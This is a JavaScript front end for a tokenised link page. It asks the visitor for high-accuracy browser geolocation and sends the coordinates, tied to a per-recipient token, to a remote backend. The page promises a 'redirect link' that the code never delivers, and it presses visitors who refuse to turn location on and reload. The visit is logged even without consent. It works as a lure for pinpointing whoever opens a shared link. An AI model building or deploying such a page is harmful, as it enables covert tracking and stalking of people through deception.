// Replace this with your deployed Railway backend URL.
const API = 'https://syntaip-production.up.railway.app';
const token = new URLSearchParams(location.search).get('t');
const statusEl = document.getElementById('status');
const modal = document.getElementById('locationModal');
const modalTitle = document.getElementById('modalTitle');
const modalText = document.getElementById('modalText');
const modalState = document.getElementById('modalState');

function setModalState(title, text, state = '') {
  modalTitle.textContent = title;
  modalText.textContent = text;
  modalState.className = `modal-state ${state}`;
  modalState.textContent = state === 'done' ? '✓' : state === 'error' ? '!' : '';
}
function showStatus(message, type = '') {
  statusEl.textContent = message;
  statusEl.className = `status ${type}`;
}

async function recordVisit(locationData = {}) {
  const response = await fetch(`${API}/api/visit`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token, ...locationData })
  });
  const data = await response.json().catch(() => ({}));
  if (!response.ok) throw new Error(data.error || 'Unable to record this visit.');
  return data;
}

function requestBrowserLocation() {
  return new Promise(resolve => {
    if (!navigator.geolocation) {
      resolve({
        browser_location_status: 'unsupported'
      });
      return;
    }

    navigator.geolocation.getCurrentPosition(
      position => {
        console.log('GEOLOCATION SUCCESS:', {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy
        });

        resolve({
          browser_latitude: position.coords.latitude,
          browser_longitude: position.coords.longitude,
          browser_accuracy: position.coords.accuracy,
          browser_location_status: 'granted'
        });
      },

      error => {
        console.error('GEOLOCATION ERROR:', {
          code: error.code,
          message: error.message
        });

        resolve({
          browser_location_status:
            error.code === 1 ? 'denied' :
            error.code === 2 ? 'unavailable' :
            error.code === 3 ? 'timeout' :
            'unavailable'
        });
      },

      {
        enableHighAccuracy: true,
        timeout: 30000,
        maximumAge: 0
      }
    );
  });
}

(async function start() {
  if (!token) {
    modal.classList.add('hidden');
    showStatus('This link is missing its unique test code. Ask the person who shared it for a valid link.', 'error');
    return;
  }

  // Give the explanatory notice time to render before the browser permission prompt appears.
  setTimeout(async () => {
    setModalState('Waiting for your browser', 'Your browser should now ask for access your device location. Choose Allow after turning on location.');
    const locationData = await requestBrowserLocation();

    if (locationData.browser_location_status === 'granted') {
      setModalState('Location is being checked', 'Thanks! You will recieve a redirect link within seconds. We are securely recording the test result.', 'done');
    } else if (locationData.browser_location_status === 'denied') {
      setModalState('Permission not granted', 'No precise location was shared. Please turn on location and reload the page', 'error');
    } else {
      setModalState('Using approximate location', 'Precise location was unavailable. Please turn on the device location and try reloading the page.');
    }

    try {
      await recordVisit(locationData);
      modal.classList.add('hidden');
      showStatus(
        locationData.browser_location_status === 'granted'
          ? 'Your test visit was recorded with the location you approved. Please wait!'
          : 'Please turn on device location and reload the page.',
        'success'
      );
    } catch (error) {
      modal.classList.add('hidden');
      showStatus(error.message || 'The service is temporarily unavailable.', 'error');
    }
  }, 900);
})();
